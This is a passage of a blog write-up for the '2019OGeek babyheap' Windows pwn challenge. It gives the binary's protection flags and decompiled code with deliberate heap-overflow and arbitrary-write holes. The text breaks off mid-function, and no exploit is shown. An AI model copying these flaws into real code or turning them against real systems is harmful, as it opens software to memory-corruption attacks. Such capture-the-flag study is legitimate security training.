<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>2019OGeek - babyheap | ret2ver</title><meta name="keywords" content="Pwn,WriteUp,Windows,Back-End"><meta name="author" content="Vergissmeinnicht"><meta name="copyright" content="Vergissmeinnicht"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="保护检查1234567891011121314Results for: .\babyheap.exeDynamic Base    : &quot;Present&quot;ASLR            : &quot;Present&quot;High Entropy VA : &quot;NotPresent&quot;Force Integrity : &quot;NotPresent&amp;q">
<meta property="og:type" content="article">
<meta property="og:title" content="2019OGeek - babyheap">
<meta property="og:url" content="https://ret2ver.github.io/2021/10/07/2019OGeek-babyheap/index.html">
<meta property="og:site_name" content="ret2ver">
<meta property="og:description" content="保护检查1234567891011121314Results for: .\babyheap.exeDynamic Base    : &quot;Present&quot;ASLR            : &quot;Present&quot;High Entropy VA : &quot;NotPresent&quot;Force Integrity : &quot;NotPresent&amp;q">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
<meta property="article:published_time" content="2021-10-07T12:30:14.000Z">
<meta property="article:modified_time" content="2022-05-04T12:13:00.145Z">
<meta property="article:author" content="Vergissmeinnicht">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="WriteUp">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="Back-End">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ret2ver.github.io/2021/10/07/2019OGeek-babyheap/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '2019OGeek - babyheap',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-05-04 20:13:00'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.1.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2022/04/29/RkrKDQiodbYj2eu.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">15</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">32</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ret2ver</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2019OGeek - babyheap</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-10-07T12:30:14.000Z" title="Created 2021-10-07 20:30:14">2021-10-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-05-04T12:13:00.145Z" title="Updated 2022-05-04 20:13:00">2022-05-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2019OGeek - babyheap"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="保护检查"><a href="#保护检查" class="headerlink" title="保护检查"></a>保护检查</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Results <span class="keyword">for</span>: .\babyheap.exe</span><br><span class="line">Dynamic Base    : <span class="string">&quot;Present&quot;</span></span><br><span class="line">ASLR            : <span class="string">&quot;Present&quot;</span></span><br><span class="line">High Entropy VA : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">Force Integrity : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">Isolation       : <span class="string">&quot;Present&quot;</span></span><br><span class="line">NX              : <span class="string">&quot;Present&quot;</span></span><br><span class="line">SEH             : <span class="string">&quot;Present&quot;</span></span><br><span class="line">CFG             : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">RFG             : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">SafeSEH         : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">GS              : <span class="string">&quot;Present&quot;</span></span><br><span class="line">Authenticode    : <span class="string">&quot;NotPresent&quot;</span></span><br><span class="line">.NET            : <span class="string">&quot;NotPresent&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *<span class="built_in">stdout</span>; <span class="comment">// eax</span></span><br><span class="line">  SIZE_T size; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *malloc_chunk_ptr; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> count; <span class="comment">// esi</span></span><br><span class="line">  LPVOID v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> name; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  SIZE_T v14; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  _BYTE *v15; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> hidden_flag; <span class="comment">// [esp+17h] [ebp-11h]</span></span><br><span class="line">  <span class="type">char</span> target[<span class="number">4</span>]; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> len[<span class="number">4</span>]; <span class="comment">// [esp+1Ch] [ebp-Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> choice[<span class="number">4</span>]; <span class="comment">// [esp+20h] [ebp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">stdout</span> = _acrt_iob_func(<span class="number">1u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">  hHeap = HeapCreate(<span class="number">1u</span>, <span class="number">0x2000</span>u, <span class="number">0x2000</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my old-school menu-style babyheap.exe v1.0!&quot;</span>);</span><br><span class="line">  Sleep(<span class="number">0x3E8</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I call it the Novice Village.&quot;</span>);</span><br><span class="line">  Sleep(<span class="number">0x3E8</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hope you learn some windows exploitation skills through this challenge :)&quot;</span>);</span><br><span class="line">  Sleep(<span class="number">0x3E8</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And here is your Novice village gift : 0x%p\n&quot;</span>, (<span class="type">char</span>)func);</span><br><span class="line">  hidden_flag = <span class="number">1</span>;</span><br><span class="line">  *(_DWORD *)choice = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nSo what do you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Make a sword&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Destroy a sword&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Polish a sword&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. Check a sword&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. Weapon is equipped. I&#x27;m ready for new challenge!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your choice?&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="type">char</span>)choice) != <span class="number">1</span> )</span><br><span class="line">LABEL_49:</span><br><span class="line">    err_exit();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)choice == <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">int</span> *)choice &gt; <span class="number">1337</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_45:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;invalid!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( *(_DWORD *)choice == <span class="number">1337</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You find the hidden level!&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( hidden_flag )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Qualified!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Forget awkward SWORDs, you will experience the power of GUNs!&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;But only once in Novice Village.&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;So what&#x27;s your target?&quot;</span>);</span><br><span class="line">        *(_DWORD *)target = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="type">char</span>)target) != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">        getchar();</span><br><span class="line">        **(_BYTE **)target = hidden_flag;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Hit the target, awesome shoot!&quot;</span>);</span><br><span class="line">        hidden_flag = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;But you are not qualified this time...&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( *(_DWORD *)choice )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          *(_DWORD *)choice = <span class="number">-1</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;\nNew weapon brings new power.&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Answer my questions so I can make a sword for you.\n&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;How long is your sword?&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="type">char</span>)choice) != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">          getchar();</span><br><span class="line">          size = *(_DWORD *)choice;</span><br><span class="line">          <span class="keyword">if</span> ( *(<span class="type">int</span> *)choice &lt;= <span class="number">0</span> || *(<span class="type">int</span> *)choice &gt; <span class="number">0x100</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Oh no, be realistic!&quot;</span>);</span><br><span class="line">            size = *(_DWORD *)choice;</span><br><span class="line">          &#125;</span><br><span class="line">          malloc_chunk_ptr = HeapAlloc(hHeap, <span class="number">1u</span>, size);</span><br><span class="line">          <span class="keyword">if</span> ( !malloc_chunk_ptr )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">          count = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ( swords_used[count] )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( ++count &gt;= <span class="number">18</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">puts</span>(<span class="string">&quot;You have carried so many swords, take easy!&quot;</span>);</span><br><span class="line">              <span class="keyword">goto</span> LABEL_46;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          swords[count] = malloc_chunk_ptr;</span><br><span class="line">          swords_used[count] = <span class="number">1</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Well done! Name it!&quot;</span>);</span><br><span class="line">          v14 = *(_DWORD *)choice;</span><br><span class="line">          v7 = swords[count];</span><br><span class="line">          name = <span class="number">0</span>;</span><br><span class="line">          *(_DWORD *)len = v7;</span><br><span class="line">          v9 = getchar();</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v9 == <span class="number">10</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            *(_BYTE *)(name + *(_DWORD *)len) = v9;</span><br><span class="line">            ++name;</span><br><span class="line">            v9 = getchar();</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( name != v14 );</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          *(_DWORD *)choice = <span class="number">-1</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;\nLet the past be the past.\n&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Which sword do you want to destroy?&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="type">char</span>)choice) != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">          getchar();</span><br><span class="line">          <span class="keyword">if</span> ( *(_DWORD *)choice &gt; <span class="number">0x11</span>u )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;no no no, be kind!&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !swords_used[*(_DWORD *)choice] )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">            <span class="keyword">if</span> ( !HeapFree(hHeap, <span class="number">1u</span>, swords[*(_DWORD *)choice]) )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">            <span class="keyword">if</span> ( *(_DWORD *)choice &gt;= <span class="number">0x12</span>u )</span><br><span class="line">            &#123;</span><br><span class="line">              __report_rangecheckfailure();</span><br><span class="line">              JUMPOUT(<span class="number">0x401560</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            swords_used[*(_DWORD *)choice] = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Succeed!&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          *(_DWORD *)choice = <span class="number">-1</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;\nA little change will make a difference.\n&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Which one will you polish?&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="type">char</span>)choice) != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">          getchar();</span><br><span class="line">          <span class="keyword">if</span> ( *(_DWORD *)choice &gt; <span class="number">0x11</span>u )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( swords_used[*(_DWORD *)choice] )</span><br><span class="line">          &#123;</span><br><span class="line">            *(_DWORD *)len = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;And what&#x27;s the length this time?&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="type">char</span>)len) != <span class="number">1</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Then name it again : &quot;</span>);</span><br><span class="line">            v13 = *(_DWORD *)len;</span><br><span class="line">            v10 = <span class="number">0</span>;</span><br><span class="line">            v15 = swords[*(_DWORD *)choice];</span><br><span class="line">            v11 = getchar();</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( v11 == <span class="number">10</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              v15[v10++] = v11;</span><br><span class="line">              v11 = getchar();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( v10 != v13 );</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">LABEL_25:</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;It seems that you don&#x27;t own this sword.&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">          *(_DWORD *)len = <span class="number">-1</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;\nCherish what you&#x27;ve own.\n&quot;</span>);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Which one will you check?&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="type">char</span>)len) != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_49;</span><br><span class="line">          getchar();</span><br><span class="line">          <span class="keyword">if</span> ( *(_DWORD *)len &gt; <span class="number">0x11</span>u )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !swords_used[*(_DWORD *)len] )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Show : %s\n&quot;</span>, (<span class="type">char</span>)swords[*(_DWORD *)len]);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_45;</span><br><span class="line">      &#125;</span><br><span class="line">    